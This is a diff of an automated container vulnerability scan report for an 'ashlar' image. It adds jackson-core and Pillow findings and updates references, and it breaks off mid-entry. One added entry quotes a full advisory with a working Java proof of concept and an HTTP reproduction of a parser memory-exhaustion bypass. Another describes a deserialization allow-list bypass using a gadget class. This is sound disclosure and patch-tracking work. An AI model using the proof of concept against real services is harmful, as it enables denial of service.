@@ -1,7 +1,7 @@
 {
   "tool": "ashlar",
-  "scan_timestamp": "2026-07-01T06:49:34Z",
-  "workflow_run_id": "28498663118",
+  "scan_timestamp": "2026-08-01T05:47:11Z",
+  "workflow_run_id": "30686025722",
   "versions": {
     "1.20.0": {
       "image": "ghcr.io/bundlecore/products/bfx/ashlar:1.20.0",
@@ -76,6 +76,52 @@
           "LastModifiedDate": "2026-06-17T09:37:27.057Z"
         },
         {
+          "VulnerabilityID": "GHSA-r7wm-3cxj-wff9",
+          "PkgName": "com.fasterxml.jackson.core:jackson-core",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/ashlar/jars/bioformats_package.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-core@2.14.2",
+            "UID": "f800698b925b0138"
+          },
+          "InstalledVersion": "2.14.2",
+          "FixedVersion": "2.18.8, 2.21.4, 2.22.1",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0ada8e1de6c1a9d34f8034709d2eda19734a242b1470ff34ad23e79cd2bd74b1",
+            "DiffID": "sha256:d5e66515b46453d94b906716c47e4ee5e98dd52ba2b89517edb39038db6e529e"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-r7wm-3cxj-wff9",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:184f6d188623314d26ffbac69bc557dd8a2f080f41b624b59ef1430402026162",
+          "Title": "jackson-core: Async parser maxNumberLength bypass via chunked digit accumulation (incomplete fix for GHSA-72hv-8253-57qq)",
+          "Description": "## Summary\n\nThe fix released in jackson-core `2.18.6` and `2.21.1` for [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-core/security/advisories/GHSA-72hv-8253-57qq) (Number Length Constraint Bypass in Async Parser, published 2026-02-28) is incomplete. The fix commit `b0c428e6` (#1555) wired `validateIntegerLength` into a new `_setIntLength` helper and called it at every place where the integer portion of a number is *decided* (terminator byte arrived, `.` / `e/E` seen, end-of-feed inside a fully-buffered value). It did not call it on the much more attacker-relevant path: \"ran out of input while still inside `MINOR_NUMBER_INTEGER_DIGITS`, return `NOT_AVAILABLE` to caller\".\n\nAs a result, an attacker who streams JSON to a non-blocking parser in many small chunks, without ever sending a terminator byte, can keep the parser inside `MINOR_NUMBER_INTEGER_DIGITS` indefinitely. `_textBuffer.expandCurrentSegment()` grows on every chunk, and `validateIntegerLength` is never invoked. The accumulator is only gated by `maxStringLength` (20 MiB default) — a **~20,000x amplification** of the documented `maxNumberLength` (1000 default).\n\nThis is the same vulnerability class, same advisory wording (\"Memory Exhaustion: Unbounded allocation in TextBuffer from excessively long numbers\"), same parser class — just the streaming path the original fix didn't cover. The fix to the *fraction* path is correct (see `_finishFloatFraction` at line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in 2.18.6, where `_setFractLength(fractLen)` IS called before the `NOT_AVAILABLE` return); the equivalent call is missing from every integer-digit path.\n\n## Affected versions\n\nVerified on the patched releases:\n- `com.fasterxml.jackson.core:jackson-core` **2.18.6**\n- `com.fasterxml.jackson.core:jackson-core` **2.21.1**\n\nStructurally identical code in `tools.jackson.core` 3.0.x / 3.1.x — same `NonBlockingUtf8JsonParserBase` class, same `_setIntLength` rollout, same NOT_AVAILABLE returns without validation. Not retested but presumed vulnerable.\n\n## Affected code\n\n[`src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java`](https://github.com/FasterXML/jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jackson/core/json/async/NonBlockingUtf8JsonParserBase.java) in 2.18.6 / 2.21.1.\n\n### Site 1 — `_startPositiveNumber(int ch)` lines 1320-1330:\n\n```java\nif (outPtr >= outBuf.length) {\n    // NOTE: must expand to ensure contents all in a single buffer (to keep\n    // other parts of parsing simpler)\n    outBuf = _textBuffer.expandCurrentSegment();\n}\noutBuf[outPtr++] = (char) ch;\nif (++_inputPtr >= _inputEnd) {\n    _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n    _textBuffer.setCurrentLength(outPtr);\n    return _updateTokenToNA();          // <-- no validateIntegerLength(outPtr)\n}\n```\n\n### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:\n\n```java\nprotected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n    int negMod = _numberNegative ? -1 : 0;\n\n    while (true) {\n        if (_inputPtr >= _inputEnd) {\n            _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n            _textBuffer.setCurrentLength(outPtr);\n            return _updateTokenToNA();    // <-- no validateIntegerLength(outPtr + negMod)\n        }\n        int ch = getByteFromBuffer(_inputPtr) & 0xFF;\n        if (ch < INT_0) {\n            if (ch == INT_PERIOD) {\n                _setIntLength(outPtr+negMod);   // <-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        if (ch > INT_9) {\n            if ((ch | 0x20) == INT_e) {\n                _setIntLength(outPtr+negMod);   // <-- validated here\n                ++_inputPtr;\n                return _startFloat(outBuf, outPtr, ch);\n            }\n            break;\n        }\n        ++_inputPtr;\n        if (outPtr >= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n    }\n    _setIntLength(outPtr+negMod);            // <-- validated here\n    _textBuffer.setCurrentLength(outPtr);\n    return _valueComplete(JsonToken.VALUE_NUMBER_INT);\n}\n```\n\nThe pattern recurs at lines 1297, 1329, 1343, 1365, 1395, 1409, 1437, 1467, 1481, 1586, 1644, 1698 — every \"ran out of input mid-integer\" exit returns to the caller without validating the accumulator length.\n\n### Compare with the fraction path that is correct\n\n`_finishFloatFraction` lines 1827-1838:\n\n```java\nwhile (loop) {\n    if (ch >= INT_0 && ch <= INT_9) {\n        ++fractLen;\n        if (outPtr >= outBuf.length) {\n            outBuf = _textBuffer.expandCurrentSegment();\n        }\n        outBuf[outPtr++] = (char) ch;\n        if (_inputPtr >= _inputEnd) {\n            _textBuffer.setCurrentLength(outPtr);\n            _setFractLength(fractLen);          // <-- VALIDATED\n            return JsonToken.NOT_AVAILABLE;\n        }\n        ch = getNextSignedByteFromBuffer();\n    }\n    ...\n}\n```\n\n## Impact\n\nReactive frameworks (Spring WebFlux / Reactor, Quarkus, Helidon, Vert.x JSON, anything wrapping `JsonFactory.createNonBlockingByteArrayParser()` or `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC bytes to the async parser as they arrive. Operators who set `StreamReadConstraints.builder().maxNumberLength(N)` on the assumption that this caps memory per number value are not getting that guarantee in chunked-feed scenarios. The parser silently accumulates digits up to `maxStringLength` (20 MiB default) per concurrent connection. Multiply by attacker-controlled concurrency to OOM the JVM.\n\nThe synchronous parsers (`UTF8StreamJsonParser`, `ReaderBasedJsonParser`) and the async parser on *complete* input are not affected — those paths go through `_setIntLength` or `ParserBase._reportTooLongIntegral` correctly.\n\nCWE-770 (Allocation of Resources Without Limits or Throttling), CVSS roughly the same as the parent advisory (Network / Low complexity / High availability impact). The parent advisory was scored CVSS 8.7 High.\n\n## Proof of concept\n\nStandalone PoC, no Maven required:\n\n```\nmkdir poc && cd poc\ncurl -sLo jackson-core-2.18.6.jar https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.18.6/jackson-core-2.18.6.jar\ncat > PoC.java <<'EOF'\nimport com.fasterxml.jackson.core.*;\nimport com.fasterxml.jackson.core.async.ByteArrayFeeder;\n\npublic class PoC {\n    public static void main(String[] args) throws Exception {\n        StreamReadConstraints strict = StreamReadConstraints.builder()\n                .maxNumberLength(1000)\n                .build();\n        JsonFactory f = new JsonFactoryBuilder()\n                .streamReadConstraints(strict)\n                .build();\n\n        // Sanity: synchronous parser rejects 5000-digit int.\n        try (JsonParser p = f.createParser(\"{\\\"v\\\":\" + \"1\".repeat(5000) + \"}\")) {\n            while (p.nextToken() != null) { /* drive */ }\n            System.out.println(\"[-] BUG ABSENT: sync parser accepted\");\n            return;\n        } catch (Exception e) {\n            System.out.println(\"[+] sync parser rejected 5000-digit int: \" + e.getClass().getSimpleName());\n        }\n\n        // Bug: async parser, chunked, no terminator.\n        JsonParser ap = f.createNonBlockingByteArrayParser();\n        ByteArrayFeeder feeder = (ByteArrayFeeder) ap;\n\n        byte[] preamble = \"{\\\"v\\\":\".getBytes(\"UTF-8\");\n        feeder.feedInput(preamble, 0, preamble.length);\n        while (ap.nextToken() != JsonToken.NOT_AVAILABLE) { /* drain */ }\n\n        byte[] digits = new byte[16 * 1024];\n        for (int i = 0; i < digits.length; i++) digits[i] = (byte) ('1' + (i % 9));\n\n        for (int c = 0; c < 600; c++) {\n            feeder.feedInput(digits, 0, digits.length);\n            JsonToken t = ap.nextToken();\n            if (t != JsonToken.NOT_AVAILABLE) {\n                System.out.println(\"[-] unexpected token: \" + t);\n                return;\n            }\n        }\n        System.out.println(\"[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\");\n\n        // Closing the number now finally triggers the validator.\n        feeder.feedInput(\"}\".getBytes(\"UTF-8\"), 0, 1);\n        feeder.endOfInput();\n        try {\n            while (ap.nextToken() != null) { /* drive */ }\n        } catch (Exception e) {\n            System.out.println(\"[*] late rejection on close: \" + e.getMessage().split(\"\\n\")[0]);\n        }\n        ap.close();\n    }\n}\nEOF\njavac -cp jackson-core-2.18.6.jar PoC.java\njava -Xmx256m -cp jackson-core-2.18.6.jar:. PoC\n```\n\nObserved output against `jackson-core-2.18.6`:\n\n```\n[+] sync parser rejected 5000-digit int: StreamConstraintsException\n[+] BUG PRESENT: async parser accepted ~9.83 MB of digits with maxNumberLength=1000\n[*] late rejection on close: Number value length (9830400) exceeds the maximum allowed (1000, from `StreamReadConstraints.getMaxNumberLength()`)\n```\n\nObserved output against `jackson-core-2.21.1`: identical.\n\nThe 9.83 MB figure is purely a function of the loop bound (600 chunks * 16 KiB). The actual ceiling is `maxStringLength = 20 MiB`. With the strict policy declared as `maxNumberLength = 1000`, the parser permits **9830x** more allocation than the policy allows. With `maxStringLength` left at the default 20 MiB, an attacker can drive a single connection to 40 MiB of `char[]` heap (chars are 2 bytes each) before the validator finally fires on terminator/`endOfInput()`. Multiply by concurrent connections.\n\n## End-to-end reproduction through real HTTP\n\nSupplements the standalone PoC with a running Spring Boot WebFlux server,\ndriving the same bug through the actual reactor-netty + Jackson2JsonDecoder\nstreaming-decode path that production reactive endpoints use.\n\nSetup:\n- Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14, reactor-netty 1.1.23)\n- jackson-databind 2.17.2, jackson-core overridden:\n  - VULN run: `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest published)\n  - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch\n- JVM: OpenJDK 17.0.18\n- Server `JsonFactory` configured with `StreamReadConstraints.builder().maxNumberLength(1000).build()`\n\nEndpoint under test exposes the `Flux<DataBuffer>` request body directly to\n`Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so the parser sees one\nHTTP chunk per `feedInput` (the same pattern used for any\n`@RequestBody Flux<...>` / streaming JSON decoder in WebFlux). A raw-socket\nHTTP/1.1 chunked client streams `{\"v\":1` then 250 chunks of 200 digit bytes\neach (50,000 digits total) at 20ms intervals, then writes the closing `}`.\n\nVULN — jackson-core 2.18.7:\n```\n[VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks; server still accepting\n[VULN-SMALLCHUNK] full POST sent (50000 digits). Response:\nHTTP/1.1 200 OK\nERR after 6548ms cause=com.fasterxml.jackson.core.exc.StreamConstraintsException:\n       Number value length (50000) exceeds the maximum allowed (1000, ...)\n```\nServer-side controller trace (250 DataBuffer arrivals elided):\n```\n[ctrl] DataBuffer arrived size=6   ms=39       <- '{\"v\":1'\n[ctrl] DataBuffer arrived size=200 ms=42\n...\n[ctrl] DataBuffer arrived size=199 ms=5993\n[ctrl] DataBuffer arrived size=1   ms=6518     <- closing '}'\n[ctrl] ERR after 6548ms ... Number value length (50000) exceeds ...\n```\nServer held all 50,000 digit characters in `_textBuffer` for 6.5 seconds with\n`maxNumberLength=1000` declared. The validator never fires during streaming;\nit only fires at value-completion when the closing `}` arrives.\n\nPATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):\n```\n[PATCHED-SMALLCHUNK] connection broke after 2801 digits at chunk 14: [Errno 32] Broken pipe\n[PATCHED-SMALLCHUNK] DONE: digits_sent=2801 status=connection-broke-mid-stream\n```\nServer-side controller trace:\n```\n[ctrl] DataBuffer arrived size=6   ms=129\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=142\n[ctrl] DataBuffer arrived size=200 ms=145\n[ctrl] DataBuffer arrived size=200 ms=146\n[ctrl] DataBuffer arrived size=200 ms=147\n[ctrl] ERR after 155ms ... Number value length (1001) exceeds the maximum allowed (1000, ...)\n```\nPatched server raises `StreamConstraintsException` at 155ms after only 5\nDataBuffers, exactly when the accumulated digit count crosses\n`maxNumberLength=1000`. The connection is reset mid-stream rather than the\nparser silently consuming the rest of the attacker's payload.\n\nSide-by-side:\n\n| Build | Chunks accepted before exception | Digits buffered | Time to detection |\n|---|---|---|---|\n| jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the configured limit) | 6,548ms — only at terminator |\n| 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment threshold crossed |\n\nNote on the default `@RequestBody Mono<JsonNode>` path: that path cannot\ndistinguish the two builds because Spring's `decodeToMono` joins all\nDataBuffers into one before parsing. The exploitable shape is the\nstreaming-decode path (`Flux<JsonNode>` / `@RequestBody Flux<...>` /\nWebSocket / SSE / any direct `decoder.decode(Flux<DataBuffer>, ...)` call),\nwhich is also what `Jackson2Tokenizer` uses for any streaming JSON\ndeserialization in WebFlux and Quarkus reactive REST.\n\n## Suggested fix\n\nMirror the pattern already used in `_finishFloatFraction`. At every site that returns `_updateTokenToNA()` (or `JsonToken.NOT_AVAILABLE`) with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr + negMod)` first. Concretely, the diff to `NonBlockingUtf8JsonParserBase.java` would be:\n\n```diff\n     protected JsonToken _finishNumberIntegralPart(char[] outBuf, int outPtr) throws IOException {\n         int negMod = _numberNegative ? -1 : 0;\n\n         while (true) {\n             if (_inputPtr >= _inputEnd) {\n                 _minorState = MINOR_NUMBER_INTEGER_DIGITS;\n                 _textBuffer.setCurrentLength(outPtr);\n+                _streamReadConstraints.validateIntegerLength(outPtr + negMod);\n                 return _updateTokenToNA();\n             }\n```\n\nNote: `_setIntLength` itself can't be used as-is because it also assigns `_intLength`, and `_intLength` must not be set until the integer is truly complete (subsequent fraction handling reads `_intLength`). The minimal fix is to call only the validator, as shown.\n\nApply the same one-line insertion before each `return _updateTokenToNA();` that exits with `_minorState = MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12 lines total).\n\nAlternatively, a heavier refactor: also gate `_textBuffer.expandCurrentSegment()` calls inside the digit-accumulation loops on `outPtr < maxNumberLength` so that the validator fires at the moment the buffer would be enlarged past the limit, rather than waiting for the next chunk boundary. Either approach is sufficient.\n\n## Credit\n\nReported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            }
+          },
+          "References": [
+            "https://github.com/FasterXML/jackson-core",
+            "https://github.com/FasterXML/jackson-core/commit/050b429804dce2a7e08f0be1b0b4c3d040fdb9cd",
+            "https://github.com/FasterXML/jackson-core/commit/4cdd529749da396cc7edf6d4a2aad41d47902641",
+            "https://github.com/FasterXML/jackson-core/commit/c5941e5aae7fd5aeac55d66933cfb82b9aabeef8",
+            "https://github.com/FasterXML/jackson-core/pull/1611",
+            "https://github.com/FasterXML/jackson-core/security/advisories/GHSA-r7wm-3cxj-wff9"
+          ],
+          "PublishedDate": "2026-07-21T21:58:53Z",
+          "LastModifiedDate": "2026-07-21T21:58:53Z"
+        },
+        {
           "VulnerabilityID": "CVE-2026-54512",
           "VendorIDs": [
             "GHSA-j3rv-43j4-c7qm"
@@ -101,7 +147,7 @@
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
           },
           "Fingerprint": "sha256:dbcdf39d2a7118e2c5b1a695be6038e727ab20b2e305c27cb8576d447080c88c",
-          "Title": "jackson-databind contains the general-purpose data-binding functionali ...",
+          "Title": "jackson-databind: jackson-databind: Arbitrary code execution via PolymorphicTypeValidator bypass",
           "Description": "jackson-databind contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor. From 2.10.0 until 2.18.8, 2.21.4, and 3.1.4, jackson-databind's PolymorphicTypeValidator (PTV) is the primary safety mechanism guarding polymorphic deserialization. When polymorphic typing is enabled and a type identifier contains generic parameters (i.e. the type ID string contains <), DatabindContext._resolveAndValidateGeneric() validates only the raw container class name (the substring before <) against the configured PTV. If the container type is approved, the method parses the full canonical type string via TypeFactory.constructFromCanonical() and returns the fully parameterized type without ever validating the nested type arguments against the PTV. The nested type arguments are then resolved, instantiated, and populated as beans during deserialization. An attacker who controls the type ID can therefore place a denied class as a generic type parameter of an allowed container — for example java.util.ArrayList<com.evil.Gadget> when only java.util.ArrayList is allow-listed. The container passes the PTV check; com.evil.Gadget is loaded via Class.forName(name, true, loader), instantiated, and its properties are set from attacker-controlled JSON. This completely bypasses an explicitly configured PTV allow-list. This vulnerability is fixed in 2.18.8, 2.21.4, and 3.1.4.",
           "Severity": "HIGH",
           "CweIDs": [
@@ -109,19 +155,42 @@
             "CWE-502"
           ],
           "VendorSeverity": {
-            "ghsa": 3
+            "alma": 3,
+            "amazon": 3,
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
               "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
               "V3Score": 8.1
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 8.1
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:40895",
+            "https://access.redhat.com/security/cve/CVE-2026-54512",
+            "https://bugzilla.redhat.com/2492010",
+            "https://bugzilla.redhat.com/2492015",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2492010",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2492015",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54512",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54513",
+            "https://errata.almalinux.org/9/ALSA-2026-40895.html",
+            "https://errata.rockylinux.org/RLSA-2026:40895",
             "https://github.com/FasterXML/jackson-databind",
             "https://github.com/FasterXML/jackson-databind/commit/434d6c511de7fdd9872f29157aafb6162d12d8d5",
             "https://github.com/FasterXML/jackson-databind/issues/5988",
-            "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-j3rv-43j4-c7qm"
+            "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-j3rv-43j4-c7qm",
+            "https://linux.oracle.com/cve/CVE-2026-54512.html",
+            "https://linux.oracle.com/errata/ELSA-2026-43400.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-54512",
+            "https://www.cve.org/CVERecord?id=CVE-2026-54512"
           ],
           "PublishedDate": "2026-06-23T21:17:02.203Z",
           "LastModifiedDate": "2026-06-27T21:01:36.47Z"
@@ -159,8 +228,12 @@
             "CWE-184"
           ],
           "VendorSeverity": {
+            "alma": 3,
+            "amazon": 3,
             "ghsa": 3,
-            "redhat": 3
+            "oracle-oval": 3,
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
@@ -173,8 +246,29 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:36839",
+            "https://access.redhat.com/errata/RHSA-2026:40895",
+            "https://access.redhat.com/errata/RHSA-2026:41951",
+            "https://access.redhat.com/errata/RHSA-2026:43218",
+            "https://access.redhat.com/errata/RHSA-2026:43400",
+            "https://access.redhat.com/errata/RHSA-2026:44061",
+            "https://access.redhat.com/errata/RHSA-2026:44062",
+            "https://access.redhat.com/errata/RHSA-2026:44063",
+            "https://access.redhat.com/errata/RHSA-2026:44064",
+            "https://access.redhat.com/errata/RHSA-2026:44065",
+            "https://access.redhat.com/errata/RHSA-2026:44066",
+            "https://access.redhat.com/errata/RHSA-2026:44271",
+            "https://access.redhat.com/errata/RHSA-2026:48095",
+            "https://access.redhat.com/errata/RHSA-2026:48151",
             "https://access.redhat.com/security/cve/CVE-2026-54513",
+            "https://bugzilla.redhat.com/2492010",
+            "https://bugzilla.redhat.com/2492015",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2492010",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2492015",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54512",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54513",
+            "https://errata.almalinux.org/9/ALSA-2026-40895.html",
+            "https://errata.rockylinux.org/RLSA-2026:40895",
             "https://github.com/FasterXML/jackson-databind",
             "https://github.com/FasterXML/jackson-databind/commit/01d1692c8d0ed03e51a0e3c4f8a9e6908e4931e5",
             "https://github.com/FasterXML/jackson-databind/commit/24529da29fdf46ff94ca38de9ebf31cd188f5e8e",
@@ -182,12 +276,14 @@
             "https://github.com/FasterXML/jackson-databind/issues/5983",
             "https://github.com/FasterXML/jackson-databind/pull/5984",
             "https://github.com/FasterXML/jackson-databind/security/advisories/GHSA-rmj7-2vxq-3g9f",
+            "https://linux.oracle.com/cve/CVE-2026-54513.html",
+            "https://linux.oracle.com/errata/ELSA-2026-43400.html",
             "https://nvd.nist.gov/vuln/detail/CVE-2026-54513",
             "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-54513.json",
             "https://www.cve.org/CVERecord?id=CVE-2026-54513"
           ],
           "PublishedDate": "2026-06-23T21:17:02.333Z",
-          "LastModifiedDate": "2026-06-30T03:21:03.13Z"
+          "LastModifiedDate": "2026-07-30T12:19:02.307Z"
         },
         {
           "VulnerabilityID": "CVE-2021-0341",
@@ -434,6 +530,7 @@
             "https://access.redhat.com/errata/RHSA-2026:3461",
             "https://access.redhat.com/errata/RHSA-2026:3462",
             "https://access.redhat.com/errata/RHSA-2026:4128",
+            "https://access.redhat.com/errata/RHSA-2026:42644",
             "https://access.redhat.com/errata/RHSA-2026:4942",
             "https://access.redhat.com/errata/RHSA-2026:5168",
             "https://access.redhat.com/errata/RHSA-2026:5665",
@@ -458,7 +555,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-25990"
           ],
           "PublishedDate": "2026-02-11T21:16:20.67Z",
-          "LastModifiedDate": "2026-06-30T03:17:46.933Z"
+          "LastModifiedDate": "2026-07-21T12:17:47.257Z"
         },
         {
           "VulnerabilityID": "CVE-2026-40192",
@@ -541,6 +638,10 @@
             "https://access.redhat.com/errata/RHSA-2026:24866",
             "https://access.redhat.com/errata/RHSA-2026:24977",
             "https://access.redhat.com/errata/RHSA-2026:27076",
+            "https://access.redhat.com/errata/RHSA-2026:34365",
+            "https://access.redhat.com/errata/RHSA-2026:34366",
+            "https://access.redhat.com/errata/RHSA-2026:34368",
+            "https://access.redhat.com/errata/RHSA-2026:37275",
             "https://access.redhat.com/security/cve/CVE-2026-40192",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2458856",
             "https://github.com/python-pillow/Pillow",
@@ -554,7 +655,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-40192"
           ],
           "PublishedDate": "2026-04-15T23:16:10.053Z",
-          "LastModifiedDate": "2026-06-30T03:19:16.99Z"
+          "LastModifiedDate": "2026-07-20T12:19:05.59Z"
         },
         {
           "VulnerabilityID": "CVE-2026-42311",
@@ -582,7 +683,7 @@
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
           },
           "Fingerprint": "sha256:54e8283c6b054e3bce6516df3a07f4ce952161ce4f69c34b43505f3711ca3f3d",
-          "Title": "Pillow is a Python imaging library. From version 10.3.0 to before vers ...",
+          "Title": "Pillow: python-pillow: Pillow: Arbitrary code execution via malicious PSD file processing",
           "Description": "Pillow is a Python imaging library. From version 10.3.0 to before version 12.2.0, processing a malicious PSD file could lead to memory corruption, potentially resulting in a crash or arbitrary code execution. This issue has been patched in version 12.2.0.",
           "Severity": "HIGH",
           "CweIDs": [
@@ -594,6 +695,7 @@
             "bitnami": 3,
             "ghsa": 3,
             "nvd": 3,
+            "redhat": 3,
             "ubuntu": 2
           },
           "CVSS": {
@@ -608,9 +710,14 @@
             "nvd": {
               "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
               "V3Score": 7.8
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+              "V3Score": 7.8
             }
           },
           "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-42311",
             "https://github.com/python-pillow/Pillow",
             "https://github.com/python-pillow/Pillow/commit/58f9a1d166dcb0c274807d4423522d205b0c35ea",
             "https://github.com/python-pillow/Pillow/pull/9520",
@@ -622,10 +729,751 @@
             "https://www.cve.org/CVERecord?id=CVE-2026-42311"
           ],
           "PublishedDate": "2026-05-09T06:16:10.43Z",
-          "LastModifiedDate": "2026-06-17T10:47:40.52Z"
+          "LastModifiedDate": "2026-07-24T21:10:00.143Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-54058",
+          "VendorIDs": [
+            "GHSA-62p4-gmf7-7g93"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-12.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@12.0.0",
+            "UID": "67b1b4628d170ead"
+          },
+          "InstalledVersion": "12.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:0ada8e1de6c1a9d34f8034709d2eda19734a242b1470ff34ad23e79cd2bd74b1",
+            "DiffID": "sha256:d5e66515b46453d94b906716c47e4ee5e98dd52ba2b89517edb39038db6e529e"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-54058",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:a9cc29b1f9bb99de3e5942f75db3f7c4779e432a245e04be190fda5fc58782ea",
+          "Title": "Pillow: Pillow: Memory disclosure or denial of service via crafted McIdas AREA image",
+          "Description": "Pillow is a Python imaging library. Prior to 12.3.0, when Pillow loads an uncompressed McIdas AREA image from a filename through the mmap raw codec path, attacker-controlled header words can set a row stride smaller than the natural row width, causing pixel access such as Image.tobytes(), getpixel, convert, or save to read beyond the mapped region and disclose adjacent process memory or fault. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-125"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.3
+            },
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.3
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
+              "V3Score": 9.1
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-54058",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/commit/6a8de891fb00968e5ea79bfa84368ed90b3cfc1d",
+            "https://github.com/python-pillow/Pillow/pull/9719",
+            "https://github.com/python-pillow/Pillow/releases/tag/12.3.0",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-62p4-gmf7-7g93",
+            "https://linux.oracle.com/cve/CVE-2026-54058.html",
+            "https://linux.oracle.com/errata/ELSA-2026-48021.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-54058",
+            "https://www.cve.org/CVERecord?id=CVE-2026-54058"
+          ],
+          "PublishedDate": "2026-07-14T17:17:03.433Z",
+          "LastModifiedDate": "2026-07-15T20:08:02.787Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-54059",
+          "VendorIDs": [
+            "GHSA-8v84-f9pq-wr9x"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-12.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@12.0.0",
+            "UID": "67b1b4628d170ead"
+          },
+          "InstalledVersion": "12.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
